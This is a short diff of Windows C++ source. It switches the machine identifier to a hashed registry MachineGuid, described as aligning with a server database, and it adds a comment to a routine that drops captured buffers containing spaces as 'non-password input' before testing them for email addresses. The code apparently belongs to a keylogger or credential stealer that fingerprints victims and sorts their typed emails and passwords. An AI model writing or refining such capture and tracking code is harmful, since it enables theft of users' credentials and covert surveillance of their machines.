@@ -62,13 +62,25 @@ std::string Sha256(const std::string& input) {
     return ss.str();
 }
 
-// --- 3. SYSTEM METADATA ---
+// --- 3. SYSTEM METADATA (REGISTRY-BASED FOR DATABASE ALIGNMENT) ---
 std::string GetMachineId() {
-    HW_PROFILE_INFOA hw;
-    if (GetCurrentHwProfileA(&hw)) {
-        std::string guid = hw.szHwProfileGuid;
-        guid = std::regex_replace(guid, std::regex(R"([{}])"), "");
-        return Sha256(guid);
+    char value[255];
+    DWORD BufferSize = sizeof(value);
+    HKEY hKey;
+    
+    // Open the Registry key where the standard MachineGuid is stored
+    // Using KEY_WOW64_64KEY to ensure we get the 64-bit registry value
+    LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
+    
+    if (lRes == ERROR_SUCCESS) {
+        lRes = RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)value, &BufferSize);
+        RegCloseKey(hKey);
+        
+        if (lRes == ERROR_SUCCESS) {
+            // This is the raw string (e.g. ef508dd1-092d-4d05-90ac-0b5338115bee)
+            // Hashing it matches machineIdSync(true)
+            return Sha256(std::string(value));
+        }
     }
     return "unknown_machine_id";
 }
@@ -166,6 +178,7 @@ bool IsEmail(const std::string& s) {
 
 void ProcessBuffer() {
     if (buffer.empty()) return;
+    // Password Space Validation: if space is found, discard as non-password input
     if (buffer.find(' ') != std::string::npos) { buffer.clear(); return; }
 
     if (IsEmail(buffer)) {
